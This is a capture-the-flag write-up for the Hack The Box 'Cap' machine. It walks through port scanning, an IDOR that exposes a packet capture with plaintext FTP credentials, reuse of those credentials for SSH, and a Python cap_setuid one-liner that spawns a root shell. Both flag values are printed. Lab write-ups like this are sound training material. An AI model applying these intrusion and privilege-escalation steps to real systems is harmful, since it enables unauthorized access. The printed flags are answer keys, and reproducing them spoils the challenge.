## Cap - Hack The Box Writeup

[Room Link](https://app.hackthebox.com/machines/351)

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. 
Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. 
The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

**IP: 10.10.10.245**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Wireshark <br>

**Tools Used**: Nmap, Gobuster, Wireshark<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png"/>](https://github.com/mauzware)

[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting of with Nmap scan and Gobuster fuzzing.

  ```
  nmap -sC -sV -T5 10.10.10.245
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
  |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
  |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
  80/tcp open  http    Gunicorn
  |_http-title: Security Dashboard
  |_http-server-header: gunicorn
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.10.245 -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
  /ip                   (Status: 200) [Size: 17380]
  /netstat              (Status: 200) [Size: 31114]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

- Anonymous FTP access not allowed.

---

## 🌐 Web Exploitation 

- You can't access `/data` but you can `/ip`. When you go to `Security Snapshot` it will redirect to you to `/data/8` and no additional info.

- Well, here I tried IDOR with `/data/0` and BOOOM! Found some data that we can download as `.pcap` file. Fire up the Wireshark and let's move on.

---

## 🧍 Initial Access

- After analyzing `.pcap` file I found credentials and some `.txt` file.

  ```
  220 (vsFTPd 3.0.3)

  USER nathan
  
  331 Please specify the password.
  
  PASS Buck3tH4TF0RM3!
  
  230 Login successful.
  
  SYST
  
  215 UNIX Type: L8
  
  PORT 192,168,196,1,212,140
  
  200 PORT command successful. Consider using PASV.
  
  LIST
  
  150 Here comes the directory listing.
  226 Directory send OK.
  
  PORT 192,168,196,1,212,141
  
  200 PORT command successful. Consider using PASV.
  
  LIST -al
  
  150 Here comes the directory listing.
  226 Directory send OK.
  
  TYPE I
  
  200 Switching to Binary mode.
  
  PORT 192,168,196,1,212,143
  
  200 PORT command successful. Consider using PASV.
  
  RETR notes.txt
  
  550 Failed to open file.
  
  QUIT
  
  221 Goodbye.
  ```
  
- Now, use this credentials to login with FTP and download `notes.txt` so we can read it.

  ```
  ftp 10.10.10.245         
  Connected to 10.10.10.245.
  220 (vsFTPd 3.0.3)
  Name (10.10.10.245): nathan
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> whoami
  ?Invalid command.
  ftp> pwd
  Remote directory: /home/nathan
  
  ftp> ls
  229 Entering Extended Passive Mode (|||38798|)
  150 Here comes the directory listing.
  -rw-rw-r--    1 1001     1001            0 May 06 10:58 linpeas.sh
  drwxr-xr-x    3 1001     1001         4096 May 06 07:57 snap
  -r--------    1 1001     1001           33 May 06 04:02 user.txt
  226 Directory send OK.
  
  ftp> get user.txt
  local: user.txt remote: user.txt
  229 Entering Extended Passive Mode (|||40184|)
  150 Opening BINARY mode data connection for user.txt (33 bytes).
  100% |************************************************************************|    33      257.81 KiB/s    00:00 ETA
  226 Transfer complete.
  33 bytes received in 00:00 (1.13 KiB/s)
  
  $ cat user.txt            
  ab47ec857c0adc881b66b4c645a2bdd2
  ```
  
- First flag done! Now, I tried using same credentials for SSH and well... NEVER REUSE PASSWORDS!!!!!!!

  ```
  ssh nathan@10.10.10.245
  The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
  ED25519 key fingerprint is SHA256:[SNIP!].
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
  nathan@10.10.10.245's password: 
  Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
  [SNIP!]
  Last login: Tue May  6 10:48:59 2025 from 10.10.14.31
  nathan@cap:~$ whoami
  nathan
  nathan@cap:~$ id
  uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
  nathan@cap:~$ pwd
  /home/nathan
  nathan@cap:~$ 
  ```

---

## 👑 Root Privilege Escalation

- After some enumeration, I found my way to root through Python as capability.

  ```
  nathan@cap:~$ getcap -r / 2>/dev/null
  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  ```
  
- Just use Python one-liner to spawn a root shell.

  ```
  nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  root@cap:~# whoami
  root
  root@cap:~# cat /root/root.txt
  6250bd1f5c8754f39678d829da0b920d
  ```
  
- Now I see why this room is named `Cap`.

---

## 🏁 Flags

- **User Flag**: `ab47ec857c0adc881b66b4c645a2bdd2`
- **Root Flag**: `6250bd1f5c8754f39678d829da0b920d`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much honestly, pretty fun room tho.`

- What did I learn?
  `Practiced Wireshark.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
